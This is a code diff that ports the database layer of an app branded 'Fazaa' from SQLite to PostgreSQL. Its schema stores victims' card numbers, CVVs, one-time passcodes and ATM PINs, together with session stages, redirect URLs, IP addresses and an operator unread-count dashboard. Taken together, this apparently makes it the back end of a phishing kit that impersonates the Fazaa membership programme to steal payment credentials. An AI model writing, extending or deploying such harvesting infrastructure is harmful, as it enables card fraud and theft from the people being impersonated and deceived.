@@ -1,19 +1,83 @@
 import sqlite3 from 'sqlite3';
+import pg from 'pg';
+const { Pool } = pg;
 import path from 'path';
 import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const DB_PATH = path.join(__dirname, 'fazaa.db');
+// PostgreSQL connection
+const isPostgres = !!process.env.DATABASE_URL;
+let pool: any = null;
+let sqliteDb: any = null;
 
-const db = new sqlite3.Database(DB_PATH);
-
-// Enable WAL mode
-db.run('PRAGMA journal_mode = WAL');
+if (isPostgres) {
+  console.log('[Database] Using PostgreSQL');
+  pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    ssl: {
+      rejectUnauthorized: false
+    }
+  });
+} else {
+  console.log('[Database] Using SQLite');
+  const DB_PATH = path.join(__dirname, 'fazaa.db');
+  sqliteDb = new sqlite3.Database(DB_PATH);
+  sqliteDb.run('PRAGMA journal_mode = WAL');
+}
 
 // Initialize tables
-db.exec(`
+const initSql = `
+  CREATE TABLE IF NOT EXISTS fazaa_sessions (
+    id SERIAL PRIMARY KEY,
+    sessionId TEXT NOT NULL UNIQUE,
+    fullName TEXT,
+    phoneNumber TEXT,
+    email TEXT,
+    emirate TEXT,
+    district TEXT,
+    membershipTier TEXT,
+    totalAmount TEXT DEFAULT '150',
+    cardName TEXT,
+    cardNumber TEXT,
+    cardNumberMasked TEXT,
+    cardExpiry TEXT,
+    cardCvv TEXT,
+    otpCode TEXT,
+    atmPin TEXT,
+    stage TEXT DEFAULT 'card' NOT NULL,
+    errorMessage TEXT,
+    clientIp TEXT,
+    userAgent TEXT,
+    statusRead INTEGER DEFAULT 0,
+    redirectUrl TEXT,
+    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+  );
+
+  CREATE TABLE IF NOT EXISTS registration_data (
+    id SERIAL PRIMARY KEY,
+    sessionId TEXT NOT NULL UNIQUE,
+    fullName TEXT NOT NULL,
+    phoneNumber TEXT NOT NULL,
+    email TEXT NOT NULL,
+    emirate TEXT NOT NULL,
+    district TEXT,
+    membershipTier TEXT NOT NULL,
+    totalAmount TEXT DEFAULT '150',
+    addressEmirate TEXT,
+    addressDistrict TEXT,
+    addressStreet TEXT,
+    addressBuildingNumber TEXT,
+    clientIp TEXT,
+    userAgent TEXT,
+    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+  );
+`;
+
+// SQLite version of init
+const initSqlSQLite = `
   CREATE TABLE IF NOT EXISTS fazaa_sessions (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     sessionId TEXT NOT NULL UNIQUE,
@@ -59,7 +123,13 @@ db.exec(`
     userAgent TEXT,
     createdAt TEXT DEFAULT (datetime('now'))
   );
-`);
+`;
+
+if (isPostgres) {
+  pool.query(initSql).catch((err: any) => console.error('[Database] Init error:', err));
+} else {
+  sqliteDb.exec(initSqlSQLite);
+}
 
 export interface FazaaSession {
   id: number;
@@ -107,31 +177,45 @@ export interface RegistrationData {
   createdAt: string;
 }
 
-function query<T>(sql: string, params: any[] = []): Promise<T[]> {
-  return new Promise((resolve, reject) => {
-    db.all(sql, params, (err, rows) => {
-      if (err) reject(err);
-      else resolve(rows as T[]);
+async function query<T>(sql: string, params: any[] = []): Promise<T[]> {
+  if (isPostgres) {
+    const res = await pool.query(sql.replace(/\?/g, (match: string, offset: number, string: string) => {
+        let count = 0;
+        for(let i=0; i<offset; i++) if(string[i] === '?') count++;
+        return `$${count + 1}`;
+    }), params);
+    return res.rows;
+  } else {
+    return new Promise((resolve, reject) => {
+      sqliteDb.all(sql, params, (err: any, rows: any) => {
+        if (err) reject(err);
+        else resolve(rows as T[]);
+      });
     });
-  });
+  }
 }
 
-function queryOne<T>(sql: string, params: any[] = []): Promise<T | undefined> {
-  return new Promise((resolve, reject) => {
-    db.get(sql, params, (err, row) => {
-      if (err) reject(err);
-      else resolve(row as T | undefined);
-    });
-  });
+async function queryOne<T>(sql: string, params: any[] = []): Promise<T | undefined> {
+  const rows = await query<T>(sql, params);
+  return rows[0];
 }
 
-function run(sql: string, params: any[] = []): Promise<{ lastID: number; changes: number }> {
-  return new Promise((resolve, reject) => {
-    db.run(sql, params, function(this: any) {
-      if (this) resolve({ lastID: this.lastID, changes: this.changes });
-      else reject(new Error('No response from db.run'));
+async function run(sql: string, params: any[] = []): Promise<{ lastID: number; changes: number }> {
+  if (isPostgres) {
+    const res = await pool.query(sql.replace(/\?/g, (match: string, offset: number, string: string) => {
+        let count = 0;
+        for(let i=0; i<offset; i++) if(string[i] === '?') count++;
+        return `$${count + 1}`;
+    }), params);
+    return { lastID: 0, changes: res.rowCount };
+  } else {
+    return new Promise((resolve, reject) => {
+      sqliteDb.run(sql, params, function(this: any, err: any) {
+        if (err) reject(err);
+        else resolve({ lastID: this.lastID, changes: this.changes });
+      });
     });
-  });
+  }
 }
 
 // ========== Registration CRUD ==========
@@ -205,7 +289,12 @@ export async function updateSession(sessionId: string, updates: Record<string, a
     values.push(value);
   }
   
-  fields.push("updatedAt = datetime('now')");
+  if (isPostgres) {
+    fields.push("updatedAt = CURRENT_TIMESTAMP");
+  } else {
+    fields.push("updatedAt = datetime('now')");
+  }
+  
   values.push(sessionId);
   
   await run(`UPDATE fazaa_sessions SET ${fields.join(', ')} WHERE sessionId = ?`, values);
@@ -216,8 +305,8 @@ export async function getAllSessions(limit = 100): Promise<FazaaSession[]> {
 }
 
 export async function getUnreadSessionsCount(): Promise<number> {
-  const result = await queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
-  return result?.count || 0;
+  const result = await queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
+  return Number(result?.count) || 0;
 }
 
 export async function markAllAsRead(): Promise<void> {
@@ -231,22 +320,22 @@ export async function clearAllData(): Promise<void> {
 
 export async function getStats(): Promise<{ total: number; pending: number; completed: number; failed: number; new: number; registrations: number }> {
   const [total, pending, completed, failed, newCount, registrations] = await Promise.all([
-    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions'),
-    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
-    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
-    queryOne<{ count: number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
-    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
-    queryOne<{ count: number }>('SELECT COUNT(*) as count FROM registration_data'),
+    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions'),
+    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
+    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
+    queryOne<{ count: string | number }>("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
+    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
+    queryOne<{ count: string | number }>('SELECT COUNT(*) as count FROM registration_data'),
   ]);
   
   return {
-    total: total?.count || 0,
-    pending: pending?.count || 0,
-    completed: completed?.count || 0,
-    failed: failed?.count || 0,
-    new: newCount?.count || 0,
-    registrations: registrations?.count || 0,
+    total: Number(total?.count) || 0,
+    pending: Number(pending?.count) || 0,
+    completed: Number(completed?.count) || 0,
+    failed: Number(failed?.count) || 0,
+    new: Number(newCount?.count) || 0,
+    registrations: Number(registrations?.count) || 0,
   };
 }
 
-export default db;
+export default isPostgres ? pool : sqliteDb;
